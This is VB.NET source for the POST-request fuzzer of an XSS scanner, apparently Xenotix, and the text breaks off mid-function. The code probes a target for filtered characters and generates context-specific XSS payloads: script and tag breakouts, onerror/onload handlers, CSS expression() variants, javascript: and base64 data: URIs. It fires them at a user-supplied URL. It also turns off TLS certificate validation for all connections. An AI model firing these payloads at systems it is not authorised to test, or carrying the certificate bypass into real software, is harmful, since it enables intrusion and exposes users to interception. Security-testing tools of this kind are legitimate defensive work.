Imports System.Net
Imports System.Text
Imports System.IO
Imports System.Security.Cryptography.X509Certificates
Imports System.Net.Security
Imports System.Threading
Imports System.Text.RegularExpressions

Public Class xss_fuzzer_post
    Dim i As Integer = 0
    Dim x As String
    Private trd As Thread
    Dim blind As Boolean = False
    Dim intelli As Boolean = False
    Dim context As Boolean = False
    Dim fuzzurl As String
    'Context
    Dim htmlcont As Boolean = True
    Public payloadlist As New List(Of String)
    Dim waf_less As Boolean = False
    Dim waf_great As Boolean = False
    Dim waf_single As Boolean = False
    Dim waf_double As Boolean = False
    Dim waf_script_comment = False
    Dim reflection As Boolean = True

    Public login As New CookieContainer
    Public orginal_payload_list, intellipayloadlist As New List(Of String)
    Private Delegate Sub RTB2ListDelegate()


    Private Sub RTB2List()

        Dim payload As New List(Of String)
        Dim lines() As String = System.IO.File.ReadAllLines(Application.StartupPath & "\\scripting_engine\\Modules\\payload.dat", Encoding.UTF8)
        For Each pay As String In lines
            orginal_payload_list.Add(pay)
        Next
    End Sub
    Public Function midReturn(ByVal first As String, ByVal last As String, ByRef total As String) As String
        Dim str As String
        If (last.Length < 1) Then
            str = total.Substring(total.IndexOf(first))
        End If
        If (first.Length < 1) Then
            str = total.Substring(0, total.IndexOf(last))
        End If
        Try
            str = total.Substring(total.IndexOf(first), (total.IndexOf(last) - total.IndexOf(first))).Replace(first, "").Replace(last, "")
        Catch exception1 As Exception

            Dim exception As Exception = exception1
            str = "NIL"
            Return str

        End Try
        Return str
    End Function
    Public Function ScriptContext(ByVal script As String, ByVal caps As Boolean) As Object
        Dim obj2 As String = ""
        Dim pay_Sample As String = ""
        If caps Then
            pay_Sample = "X3N0T1X"
        Else
            pay_Sample = "x3n0t1x"
        End If
        Dim num4 As Integer = Me.Count(script, pay_Sample)
        Dim i As Integer = 1
        Do While (i <= num4)
            Dim num3 As Integer = Strings.InStr(script, pay_Sample, CompareMethod.Binary)
            Dim str As String = script.Substring(((num3 + pay_Sample.Length) - 1))
            If (str.StartsWith("""") And Not Me.waf_double) Then
                Me.payloadlist.Add(""";prompt(1);""")
                Me.payloadlist.Add("""; prompt(1); //")
            ElseIf (str.StartsWith("'") And Not Me.waf_single) Then
                Me.payloadlist.Add("';prompt(1);'")
                Me.payloadlist.Add("';prompt(1); //")
            ElseIf str.StartsWith(";") Then
                Me.payloadlist.Add(";prompt(1)")
                If Not Me.waf_script_comment Then
                    Me.payloadlist.Add(";prompt(1); //")
                End If
            Else
                Me.payloadlist.Add("prompt(1);")
                If (Not Me.waf_less And Not Me.waf_great) Then
                    Me.payloadlist.Add("</script><script>prompt(1)</script>")
                End If
            End If
            script = New Regex(Regex.Escape(pay_Sample)).Replace(script, "", 1)
            i += 1
        Loop
        Return obj2
    End Function
    Public Function Count(ByRef html As String, ByVal str As String) As Integer
        Dim num3 As Integer = 0
        Dim length As Integer = 0
        Do While (length < html.Length)
            Dim num4 As Integer = Strings.InStr(Strings.Mid(Strings.LCase(html), (length + 1), (Strings.Len(CStr(html)) - length)), str, CompareMethod.Binary)
            If (num4 > 0) Then
                num3 += 1
                length = (length + ((num4 + Strings.Len(str)) - 1))
            Else
                length = html.Length
            End If
        Loop
        Return num3
    End Function

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Me.TopMost = True
        Dim flg As Integer = 0
        If TextBox3.Text < 1 Then
            MsgBox("Time Interval should not be less than 1 sec", vbInformation)
            flg = 1
        End If
        If Not (params.Text.Contains("[X]")) Then
            MsgBox("Replace the value of a parameter with [X] to start testing.", vbInformation)
            flg = 1
        End If
        If posturl.Text = "" Or posturl.Text = " " Then
            MsgBox("Please provide a valid URL", vbInformation)
            flg = 1
        ElseIf (Not (posturl.Text.StartsWith("http://") Or posturl.Text.StartsWith("https://"))) Then
            MsgBox("Invalid URL", vbCritical)
            flg = 1
        End If
        If flg = 0 Then
            Button4.Visible = True
            Button5.Visible = False
            If RadioButton1.Checked = True Then
                'Blind
                blind = True
                context = False
                intelli = False
                i = 0

                Dim t As Integer = Convert.ToInt32(TextBox3.Text)
                t = t * 1000
                Timer1.Interval = t
                Timer1.Enabled = True

                Button4.Enabled = True
                Button5.Enabled = True
                Button6.Enabled = True
                Button7.Enabled = True
            ElseIf RadioButton2.Checked = True Then
                'Intelli
                intelli = True
                context = False
                blind = False
                intellipayloadlist.Clear()
                i = 0
                Try
                    Dim newpayloads As New List(Of String)()
                    Dim testvector As String = "xen0()<>[]{}'""=;:/\|\n\r\'\"" 0xen"
                    Dim response As String = POST_REQUEST(posturl.Text, params.Text.Replace("[X]", testvector))
                    Dim testvectorarray() As String = {"xen0", "(", ")", "<", ">", "[", "]", "{", "}", "'", """", "=", ";", ":", "/", "\", "|", "\n", "\r", "\'", "\""", " ", "0xen"}
                    If (response.Contains(testvector)) Then
                        MsgBox("No XSS Filter or WAF present", vbInformation)
                    End If
                    If response.Contains("xen0") And response.Contains("0xen") Then
                        Dim reflected As String = ""
                        Dim reflectedpayload As String
                        intellipayloadlist.Clear()
                        Dim blacklisted As New List(Of String)()
                        While response.Contains("xen0") And response.Contains("0xen")
                            Dim rx As New Regex("xen0" & "(.+?)" & "0xen")
                            Dim m As Match = rx.Match(response)
                            If m.Success Then

                                reflected = m.Groups(1).ToString()
                            End If
                            reflectedpayload = "xen0" + reflected + "0xen"

                            For i As Integer = 0 To testvectorarray.Length - 1
                                If Not reflectedpayload.Contains(testvectorarray(i)) Then
                                    If blacklisted.Count > 0 Then
                                        If Not blacklisted.Contains(testvectorarray(i)) Then
                                            blacklisted.Add(testvectorarray(i))
                                        End If
                                    Else
                                        blacklisted.Add(testvectorarray(i))
                                    End If
                                End If
                            Next

                            response = response.Replace(reflectedpayload, "") ' for next iteration
                        End While
                        'Intelligent Payload
                        Dim flag As Integer
                        Dim filtered_payloads As String = ""
                        For Each pld As String In orginal_payload_list
                            flag = 1

                            For Each black As String In blacklisted

                                If pld.Contains(black) Then
                                    flag = 0

                                End If
                            Next
                            If flag.Equals(1) Then
                                intellipayloadlist.Add(pld)

                            End If
                        Next
                        For Each blak As String In blacklisted
                            filtered_payloads += "  " & blak & "  "
                        Next
                        tcount.Text = intellipayloadlist.Count
                        If filtered_payloads.Length > 0 Then
                            MsgBox("Filtered Chars :" & filtered_payloads, vbInformation)
                        End If
                        MsgBox("Successfully Added Intelligent Payloads", vbInformation)
                        Dim t As Integer = Convert.ToInt32(TextBox3.Text)
                        t = t * 1000
                        Timer1.Interval = t
                        Timer1.Enabled = True
                        Button4.Enabled = True
                        Button5.Enabled = True
                        Button6.Enabled = True
                        Button7.Enabled = True
                    Else
                        MsgBox("Test vector is completely or partially absent in the reflected context.", vbCritical)
                    End If

                Catch ee As Exception
                    MsgBox(ee.Message.ToString, vbCritical)
                End Try

            ElseIf RadioButton3.Checked = True Then
                'Contect
                context = True
                intelli = False
                blind = False
                i = 0

                payloadlist.Clear()
                waf_less = False
                waf_great = False
                waf_single = False
                waf_double = False
                waf_script_comment = False
                reflection = True
                Dim resp As String = ""
                Dim bdy As String = Me.params.Text.Replace("[X]", "x3n0t1x")
                resp = POST_REQUEST(posturl.Text, bdy)

                If Not (resp.Contains("x3n0t1x") Or resp.Contains("X3N0T1X")) Then
                    Me.reflection = False
                Else
                    Me.reflection = True
                End If
                If reflection = True Then
                    bdy = Me.params.Text.Replace("[X]", "<x3n0t1x")
                    resp = POST_REQUEST(posturl.Text, bdy)
                    If Not (resp.Contains("<x3n0t1x") Or resp.Contains("<X3N0T1X")) Then
                        Me.waf_less = True
                    End If
                    bdy = Me.params.Text.Replace("[X]", ">x3n0t1x")
                    resp = POST_REQUEST(posturl.Text, bdy)
                    If Not (resp.Contains(">x3n0t1x") Or resp.Contains(">X3N0T1X")) Then
                        Me.waf_great = True
                    End If
                    bdy = Me.params.Text.Replace("[X]", """x3n0t1x")
                    resp = POST_REQUEST(posturl.Text, bdy)
                    If Not (resp.Contains("""x3n0t1x") Or resp.Contains("""X3N0T1X")) Then
                        Me.waf_double = True
                    End If
                    bdy = Me.params.Text.Replace("[X]", "'x3n0t1x")
                    resp = POST_REQUEST(posturl.Text, bdy)
                    If Not (resp.Contains("'x3n0t1x") Or resp.Contains("'X3N0T1X")) Then
                        Me.waf_single = True
                    End If
                    bdy = Me.params.Text.Replace("[X]", "//x3n0t1x")
                    resp = POST_REQUEST(posturl.Text, bdy)
                    If Not (resp.Contains("//x3n0t1x") Or resp.Contains("//X3N0T1X")) Then
                        Me.waf_script_comment = True
                    End If
                    If Not Me.reflection Then
                        MsgBox("Parameter is not Reflected", MsgBoxStyle.Critical, Nothing)
                    Else
                        Dim str5 As String = ""
                        If Me.waf_less Then
                            str5 = (str5 & " < ")
                        End If
                        If Me.waf_great Then
                            str5 = (str5 & " > ")
                        End If
                        If Me.waf_double Then
                            str5 = (str5 & " ""  ")
                        End If
                        If Me.waf_single Then
                            str5 = (str5 & " '  ")
                        End If
                        If Me.waf_script_comment Then
                            str5 = (str5 & " //  ")
                        End If
                        If (str5.Length > 1) Then
                            MsgBox(("Filter or WAF Detected" & ChrW(13) & ChrW(10) & "Filtered Chars : " & str5), MsgBoxStyle.Information, Nothing)
                        End If
                        If (resp.Contains("x3n0t1x") Or resp.Contains("X3N0T1X")) Then
                            Dim str6 As String
                            Do While resp.Contains("<script>")
                                Dim script As String = ""
                                Try
                                    script = ""
                                    script = Me.midReturn("<script>", "</script>", resp)
                                    If Not script.Equals("NIL") Then
                                        If script.Contains("x3n0t1x") Then

                                            Me.ScriptContext(script, False)
                                        End If
                                        If script.Contains("X3N0T1X") Then
                                            Me.ScriptContext(script, True)
                                        End If
                                    Else
                                        resp = New Regex(Regex.Escape("<script>")).Replace(resp, "", 1)
                                        resp = New Regex(Regex.Escape("</script>")).Replace(resp, "", 1)
                                    End If
                                Catch exception1 As Exception

                                End Try
                                resp = resp.Replace(("<script>" & script & "</script>"), "")
                            Loop
                            Do While resp.Contains("<style>")
                                Dim str8 As String = Me.midReturn("<style>", "</style>", resp)
                                If str8.Contains("x3n0t1x") Or str8.Contains("X3N0T1X") Then
                                    Me.payloadlist.Add("width:expression(prompt(1))")
                                    Me.payloadlist.Add("width:ex/**/pression(prompt(1))")
                                    Me.payloadlist.Add("width&#x3A;ex/**/pression&#x28;prompt&#x28;1&#x29;&#x29;")
                                    Me.payloadlist.Add("width:expression\28 prompt \28 1 \29 \29")
                                    Me.payloadlist.Add("width:\0065\0078\0070\0072\0065\0073\0073\0069\006F\006E\0028\0070\0072\006F\006D\0070\0074\0028\0031\0029\0029")
                                    Me.payloadlist.Add("background-image: url(javascript:prompt(1))")
                                End If
                                resp = resp.Replace(("<style>" & str8 & "</style>"), "")
                            Loop
                            Dim flag As Boolean = False
                            Dim num As Integer = 0
                            num = Me.Count(resp, "x3n0t1x")
                            If (num <= 0) Then
                                num = Me.Count(resp, "X3N0T1X")
                                If (num > 0) Then
                                    flag = True
                                End If
                            End If
                            If Not flag Then
                                str6 = "x3n0t1x"
                            Else
                                str6 = "X3N0T1X"
                            End If
                            Dim num7 As Integer = num
                            Dim i As Integer = 1
                            Do While (i <= num7)
                                Dim ct As Integer = Strings.InStr(resp, str6, CompareMethod.Binary)
                                Dim string_after_refpoint As String = ""
                                Dim str9 As String = resp.Substring(((ct + str6.Length) - 1))
                                Try
                                    string_after_refpoint = str9.Substring(0, (str9.IndexOf(">") + 1))
                                Catch exception2 As Exception

                                End Try
                                If (Not (string_after_refpoint.StartsWith("""") Or string_after_refpoint.StartsWith("'")) And Me.htmlcont) Then
                                    Dim strArray As String() = New String() {"</script>", "</style>", "</title>", "</TEXTAREA>", "</address>", "</footer>", "</header>", "</details>", "</summary>", "</menuitem>", "</meter>", "</progress>", "</output>", "</keygen>", "</wbr>", "</math>", "</bdi>", "</video>", "</track> ", "<audio> ", "</rt>", "</rp>", "</ruby>", "</canvas>", "</figure>", "</time>", "</data>", "</figcaption>", "</main>", "</aside>", "</article>", "</nav>", "</section>", "</template>", "</svg>", "</A>", "</ABBREV>", "</ACRONYM>", "</ADDRESS>", "</APPLET>", "</AU>", "</AUTHOR>", "</B>", "</BANNER>", "</BASEFONT>", "</BGSOUND>", "</BIG>", "</BLINK>", "</BLOCKQUOTE>", "</BQ>", "</BODY>", "</CAPTION>", "</CENTER>", "</CITE>", "</CODE>", "</COLGROUP>", "</CREDIT>", "</DEL>", "</DFN>", "</DIR>", "</DIV>", "</DL>", "</DT>", "</DD>", "</EM>", "</FIG>", "</FN>", "</FONT>", "</FORM>", "</FRAME>", "</FRAMESET>", "</H1>", "</H2>", "</H3>", "</H4>", "</H5>", "</H6>", "</HEAD>", "</HTML>", "</I>", "</IFRAME>", "</INS>", "</ISINDEX>", "</KBD>", "</LANG>", "</LH>", "</LI>", "</LISTING>", "</mark>", "</MAP>", "</MARQUEE>", "</MENU>", "</MULTICOL>", "</NOBR>", "</NOFRAMES>", "</NOTE>", "</OL>", "</OVERLAY>", "</P>", "</PERSON>", "</PLAINTEXT>", "</PRE>", "</Q>", "</RANGE>", "</SAMP>", "</SELECT>", "</SMALL>", "</SPACER>", "</SPOT>", "</STRIKE>", "</STRONG>", "</SUB>", "</SUP>", "</TAB>", "</TABLE>", "</TBODY>", "</TD>", "</TEXTFLOW>", "</TFOOT>", "</TH>", "</THEAD>", "</TR>", "</TT>", "</U>", "</UL>", "</VAR>", "</WBR>", "</XMP>"}
                                    If Not Me.waf_double Then
                                        Me.payloadlist.Add("""><script>prompt(1)</script>")
                                    End If
                                    If Not Me.waf_single Then
                                        Me.payloadlist.Add("'><script>prompt(1)</script>")
                                    End If
                                    If (Not Me.waf_less And Not Me.waf_great) Then
                                        Me.payloadlist.Add("/><img src=x onerror=prompt(1)>")
                                        Me.payloadlist.Add("</option></select><svg onload=prompt(1)>")
                                        Dim num8 As Integer = (strArray.Length - 1)
                                        Dim j As Integer = 0
                                        Do While (j <= num8)
                                            Me.payloadlist.Add((strArray(j) & "<img src=x onerror=prompt(1)>"))
                                            j += 1
                                        Loop
                                    End If
                                    Me.htmlcont = False
                                End If
                                If ((string_after_refpoint.StartsWith("""") Or string_after_refpoint.StartsWith("'")) And Not string_after_refpoint.Contains("script>")) Then
                                    Dim strArray2 As String() = New String() {""" onerror=""prompt(1)", """ onload=""prompt(1)", """ onfocus=prompt(1) autofocus """}
                                    Dim strArray3 As String() = New String() {"' onerror ='prompt(1)", "' onload ='prompt(1)", "' onfocus =prompt(1) autofocus '"}
                                    If (string_after_refpoint.Contains("""") And Not Me.waf_double) Then
                                        Dim num9 As Integer = (strArray2.Length - 1)
                                        Dim k As Integer = 0
                                        Do While (k <= num9)
                                            Me.payloadlist.Add(strArray2(k))
                                            k += 1
                                        Loop
                                        If Not waf_double Then

                                            Me.payloadlist.Add("""><script>prompt(1)</script>")
                                        End If
                                    End If
                                    If (string_after_refpoint.Contains("'") And Not Me.waf_single) Then
                                        Dim num10 As Integer = (strArray3.Length - 1)
                                        Dim m As Integer = 0
                                        Do While (m <= num10)
                                            Me.payloadlist.Add(strArray3(m))
                                            m += 1
                                        Loop
                                        Me.payloadlist.Add("'><script>prompt(1)</script>")
                                    End If
                                    If Not Me.waf_double Then
                                        Me.payloadlist.Add(""" style=""width:expression(prompt(1));")
                                    End If
                                    If Not Me.waf_single Then
                                        Me.payloadlist.Add("' style='width:expression(prompt(1));")
                                    End If
                                    Me.payloadlist.Add("``onerror=prompt(1)")
                                    Me.payloadlist.Add("``onerror=prompt(1)")
                                    Me.payloadlist.Add("width:expression(prompt(1))")
                                    Me.payloadlist.Add("width:ex/**/pression(prompt(1))")
                                    Me.payloadlist.Add("width&#x3A;ex/**/pression&#x28;prompt&#x28;1&#x29;&#x29;")
                                    Me.payloadlist.Add("width:expression\28 prompt \28 1 \29 \29")
                                    Me.payloadlist.Add("width:\0065\0078\0070\0072\0065\0073\0073\0069\006F\006E\0028\0070\0072\006F\006D\0070\0074\0028\0031\0029\0029")
                                    Me.payloadlist.Add("background-image: url(javascript:prompt(1))")
                                    Me.payloadlist.Add("javascript:prompt(1)")
                                    Me.payloadlist.Add("javascript:\u0070rompt&#x28;1&#x29;")
                                    Me.payloadlist.Add("jAvAsCrIpT&colon;prompt&lpar;1&rpar;")
                                    Me.payloadlist.Add("http://jsfiddle.net/xboz/c7vvkedv/")
                                    Me.payloadlist.Add("data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4=")
                                    Me.payloadlist.Add("data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+cHJvbXB0KDEpOzwvc2NyaXB0Pjwvc3ZnPg==")
                                    Me.payloadlist.Add("data:text/html;base64,PHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4=")
                                    Me.payloadlist.Add("data:text/html;,&#60&#115&#99&#114&#105&#112&#116&#62&#112&#114&#111&#109&#112&#116&#40&#49&#41&#60&#47&#115&#99&#114&#105&#112&#116&#62")
                                End If
                                resp = New Regex(Regex.Escape(str6)).Replace(resp, "", 1)
                                i += 1
                            Loop
                            If (Me.payloadlist.Count > 0) Then
                                Me.payloadlist = Enumerable.ToList(Of String)(Enumerable.Distinct(Of String)(Me.payloadlist))

                            End If
                        End If
                        If (Me.payloadlist.Count > 0) Then
                            tcount.Text = payloadlist.Count
                            MsgBox("Successfully Added Context Based Payloads.", vbInformation)
                            Dim t As Integer = Convert.ToInt32(TextBox3.Text)
                            t = t * 1000
                            Timer1.Interval = t
                            Timer1.Enabled = True
                            Button4.Enabled = True
                            Button5.Enabled = True
                            Button6.Enabled = True
                            Button7.Enabled = True
                        End If
                    End If
                End If
            End If
          
        End If
    End Sub


    Public Shared Function ValidateRemoteCertificate(ByVal sender As Object, ByVal certificate As X509Certificate, ByVal chain As X509Chain, ByVal sslPolicyErrors As SslPolicyErrors) As Boolean
        Return True
    End Function
    Private Sub TextBox2_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TextBox2.TextChanged

    End Sub

    Private Sub post_scanner_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        On Error Resume Next
        Dim toolTip1 As New ToolTip()

        toolTip1.AutoPopDelay = 5000
        toolTip1.InitialDelay = 1000
        toolTip1.ReshowDelay = 500
        toolTip1.ShowAlways = True

        toolTip1.SetToolTip(Me.RadioButton1, "Blind Fuzzer uses the default Xenotix payload list.")
        toolTip1.SetToolTip(Me.RadioButton2, "Intelli Fuzzer detects the characters escaped by WAF and use only those payloads from the Xenotix payload list that does not contain the characters  filtered by WAF.")
        toolTip1.SetToolTip(Me.RadioButton3, "Context Fuzzer detects characters escaped by WAF along with the context of reflection and use Context Sensitive payloads that does not contain the characters filtered by WAF")

        ServicePointManager.ServerCertificateValidationCallback = AddressOf ValidateRemoteCertificate
        tcount.Text = xenotix_main.payloadcounter.Text
        posturl.Focus()
        Button4.Enabled = False
        Button5.Enabled = False
        Button6.Enabled = False
        Button7.Enabled = False
        ListView1.ShowItemToolTips = True
        ListView1.View = View.Details
        ' Set column header
        ListView1.Columns.Clear()
        ListView1.Columns.Add("Name", 100)
        ListView1.Columns.Add("Value", 100)
        trd = New Thread(AddressOf RTB2List)
        trd.IsBackground = True
        trd.Start()
    End Sub



    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        On Error Resume Next
        Timer1.Enabled = False
        Me.Close()
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick

        Dim payload_count = 0
        If blind Then
            payload_count = xenotix_main.RichTextBox1.Lines.Length
        ElseIf intelli = True Then
            payload_count = intellipayloadlist.Count
        ElseIf context Then
            payload_count = payloadlist.Count
        End If
        If (i < payload_count) Then
            If (i = payload_count) Then
                cnt.Text = payload_count
            Else
                cnt.Text = i + 1
            End If
            If blind Then
                xenotix_main.textxss.Text = xenotix_main.RichTextBox1.Lines(i)
            ElseIf intelli Then
                xenotix_main.textxss.Text = intellipayloadlist(i)
            ElseIf context Then
                xenotix_main.textxss.Text = payloadlist(i)

            End If

            Dim postReq As HttpWebRequest = DirectCast(WebRequest.Create(posturl.Text), HttpWebRequest)
            Dim encoding As New UTF8Encoding
            Dim postData As String = params.Text.Replace("[X]", xenotix_main.textxss.Text)
            Dim byteData As Byte() = encoding.GetBytes(postData)
            Dim tempCookies As New CookieContainer
            'cookie addition
            Dim cookie_countp As Integer = 0
            While cookie_countp < ListView1.Items.Count
                tempCookies.Add(New Uri(posturl.Text), _
            New Cookie(ListView1.Items(cookie_countp).Text, ListView1.Items(cookie_countp).SubItems(1).Text))
                cookie_countp = cookie_countp + 1
            End While


            'cookie addition
            'Proxy support
            If My.Settings.proxy_enabled = True Then

                Try
                    Dim myProxy As New WebProxy()
                    Dim newUri As New Uri("http://" & My.Settings.proxy_host & ":" & My.Settings.proxy_port)
                    myProxy.Address = newUri
                    myProxy.Credentials = New NetworkCredential(My.Settings.proxy_us, My.Settings.proxy_ps)
                    postReq.Proxy = myProxy
                Catch ex As Exception
                    MsgBox(ex.Message.ToString, vbCritical)
                End Try

            End If
            postReq.Method = "POST"
            postReq.KeepAlive = True
            postReq.CookieContainer = tempCookies
            postReq.Referer = posturl.Text
            postReq.ContentType = "application/x-www-form-urlencoded"
            postReq.UserAgent = "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)"
            postReq.ContentLength = byteData.Length
            postReq.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
            postReq.Headers.Add("Keep-Alive", "115")
            Dim req, absp As String
            Dim myUri As New Uri(posturl.Text)
            absp = myUri.AbsolutePath
            req = postReq.Method & " " & absp & " HTTP/" & postReq.ProtocolVersion.ToString & vbCrLf
            TextBox1.Text = req

            Try
                Dim postreqstream As Stream = postReq.GetRequestStream()
                postreqstream.Write(byteData, 0, byteData.Length)
                postreqstream.Close()
            Catch xx As Exception
                TextBox1.Text = xx.Message.ToString
            End Try
            'RESPONSE
            Try
                Dim myHttpWebResponse As HttpWebResponse = DirectCast(postReq.GetResponse(), HttpWebResponse)
                tempCookies.Add(myHttpWebResponse.Cookies)
                TextBox2.Text = "HTTP/" + myHttpWebResponse.ProtocolVersion.ToString + " " + Str(myHttpWebResponse.StatusCode) + " " + myHttpWebResponse.StatusDescription.ToString + ControlChars.CrLf
                Dim ii As Integer
                While ii < postReq.Headers.Count
                    TextBox1.Text += postReq.Headers.Keys(ii) + ":" + postReq.Headers(ii) + ControlChars.CrLf
                    ii = ii + 1
                End While
                TextBox1.Text += vbCrLf & params.Text & vbCrLf
                Dim ix As Integer
                While ix < myHttpWebResponse.Headers.Count
                    TextBox2.Text += myHttpWebResponse.Headers.Keys(ix) + ":" + myHttpWebResponse.Headers(ix) + ControlChars.CrLf
                    ix = ix + 1
                End While
                Dim postreqreader As New StreamReader(myHttpWebResponse.GetResponseStream, encoding)
                x = postreqreader.ReadToEnd
                bdy.Text = x
                myHttpWebResponse.Close()
                Button3.Enabled = False
            Catch wb As WebException
                TextBox2.Text = wb.Message.ToString
                Using response As WebResponse = wb.Response
                    Dim httpResponse As HttpWebResponse = DirectCast(response, HttpWebResponse)

                    Using data As Stream = response.GetResponseStream()
                        Using reader = New StreamReader(data)
                            Dim dat As String = reader.ReadToEnd()
                            bdy.Text = dat
                            x = dat
                        End Using
                    End Using
                End Using
            Catch xxx As Exception
                TextBox2.Text = xxx.Message.ToString
            End Try

            Try

                If xenotix_main.ie.Checked = True And xenotix_main.gc.Checked = True And xenotix_main.ff.Checked = True Then
                    xenotix_main.web.DocumentText = x
                    xenotix_main.webkit.LoadHtml(x)
                    xenotix_main.gecko.LoadHtml(x)
                ElseIf xenotix_main.ie.Checked = True And xenotix_main.gc.Checked = True And xenotix_main.ff.Checked = False Then
                    xenotix_main.web.DocumentText = x
                    xenotix_main.webkit.LoadHtml(x)

                ElseIf xenotix_main.ie.Checked = True And xenotix_main.gc.Checked = False And xenotix_main.ff.Checked = False Then
                    xenotix_main.web.DocumentText = x

                ElseIf xenotix_main.ie.Checked = True And xenotix_main.gc.Checked = False And xenotix_main.ff.Checked = True Then
                    xenotix_main.web.DocumentText = x

                    xenotix_main.gecko.LoadHtml(x)
                ElseIf xenotix_main.ie.Checked = False And xenotix_main.gc.Checked = False And xenotix_main.ff.Checked = True Then

                    xenotix_main.gecko.LoadHtml(x)
                ElseIf xenotix_main.ie.Checked = False And xenotix_main.gc.Checked = True And xenotix_main.ff.Checked = False Then

                    xenotix_main.webkit.LoadHtml(x)

                ElseIf xenotix_main.ie.Checked = False And xenotix_main.gc.Checked = True And xenotix_main.ff.Checked = True Then

                    xenotix_main.webkit.LoadHtml(x)
                    xenotix_main.gecko.LoadHtml(x)
                End If
            Catch p As Exception
            End Try
            i = i + 1
        Else

            Timer1.Enabled = False
            MsgBox("Scan Finished!", vbInformation)
            Button1.Enabled = True
            Button4.Enabled = False
            Button5.Enabled = False
            Button6.Enabled = False
            Button7.Enabled = False
            i = 0
            cnt.Text = i
        End If

    End Sub

    Function POST_REQUEST(ByVal url As String, ByVal body As String) As String
        Dim postReq As HttpWebRequest = DirectCast(WebRequest.Create(url), HttpWebRequest)
        Dim encoding As New UTF8Encoding
        Dim postData As String = body
        Dim byteData As Byte() = encoding.GetBytes(postData)
        Dim tempCookies As New CookieContainer
        'cookie addition
        Dim cookie_countp As Integer = 0
        While cookie_countp < ListView1.Items.Count
            tempCookies.Add(New Uri(url), _
        New Cookie(ListView1.Items(cookie_countp).Text, ListView1.Items(cookie_countp).SubItems(1).Text))
            cookie_countp = cookie_countp + 1
        End While


        'cookie addition

        'Proxy support
        If My.Settings.proxy_enabled = True Then

            Try
                Dim myProxy As New WebProxy()
                Dim newUri As New Uri("http://" & My.Settings.proxy_host & ":" & My.Settings.proxy_port)
                myProxy.Address = newUri
                myProxy.Credentials = New NetworkCredential(My.Settings.proxy_us, My.Settings.proxy_ps)
                postReq.Proxy = myProxy
            Catch ex As Exception
                MsgBox(ex.Message.ToString, vbCritical)
            End Try

        End If
        postReq.Method = "POST"
        postReq.KeepAlive = True
        postReq.CookieContainer = tempCookies
        postReq.Referer = url
        postReq.ContentType = "application/x-www-form-urlencoded"
        postReq.UserAgent = "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)"
        postReq.ContentLength = byteData.Length
        postReq.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        postReq.Headers.Add("Keep-Alive", "115")
        Dim req, absp As String
        Dim myUri As New Uri(posturl.Text)
        absp = myUri.AbsolutePath
        req = postReq.Method & " " & absp & " HTTP/" & postReq.ProtocolVersion.ToString & vbCrLf
        TextBox1.Text = req

        Try
            Dim postreqstream As Stream = postReq.GetRequestStream()
            postreqstream.Write(byteData, 0, byteData.Length)
            postreqstream.Close()
        Catch xx As Exception
            TextBox1.Text = xx.Message.ToString
        End Try
        'RESPONSE
        Try
            Dim myHttpWebResponse As HttpWebResponse = DirectCast(postReq.GetResponse(), HttpWebResponse)
            tempCookies.Add(myHttpWebResponse.Cookies)
            TextBox2.Text = "HTTP/" + myHttpWebResponse.ProtocolVersion.ToString + " " + Str(myHttpWebResponse.StatusCode) + " " + myHttpWebResponse.StatusDescription.ToString + ControlChars.CrLf
            Dim ii As Integer
            While ii < postReq.Headers.Count
                TextBox1.Text += postReq.Headers.Keys(ii) + ":" + postReq.Headers(ii) + ControlChars.CrLf
                ii = ii + 1
            End While
            TextBox1.Text += vbCrLf & params.Text & vbCrLf
            Dim i As Integer
            While i < myHttpWebResponse.Headers.Count
                TextBox2.Text += myHttpWebResponse.Headers.Keys(i) + ":" + myHttpWebResponse.Headers(i) + ControlChars.CrLf
                i = i + 1
            End While
            Dim postreqreader As New StreamReader(myHttpWebResponse.GetResponseStream, encoding)
            x = postreqreader.ReadToEnd
            bdy.Text = x
            myHttpWebResponse.Close()
        Catch wb As WebException
            TextBox2.Text = wb.Message.ToString
            Using response As WebResponse = wb.Response
                Dim httpResponse As HttpWebResponse = DirectCast(response, HttpWebResponse)

                Using data As Stream = response.GetResponseStream()
                    Using reader = New StreamReader(data)
                        Dim dat As String = reader.ReadToEnd()
                        bdy.Text = dat
                        x = dat
                    End Using
                End Using
            End Using
            Return x
        Catch xxx As Exception
            TextBox2.Text = xxx.Message.ToString
            Return TextBox2.Text
        End Try

        Return x
    End Function

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click
        Me.TopMost = True
        If posturl.Text = "" Or posturl.Text = " " Or params.Text = "" Then
            MsgBox("Please provide valid URL and POST parameter", vbInformation)

        ElseIf (Not (posturl.Text.Contains("http://") Or posturl.Text.Contains("https://"))) Then
            MsgBox("Invalid URL", vbCritical)
        Else

            x = POST_REQUEST(posturl.Text, params.Text)

            Try

                If xenotix_main.ie.Checked = True And xenotix_main.gc.Checked = True And xenotix_main.ff.Checked = True Then
                    xenotix_main.web.DocumentText = x
                    xenotix_main.webkit.LoadHtml(x)
                    xenotix_main.gecko.LoadHtml(x)
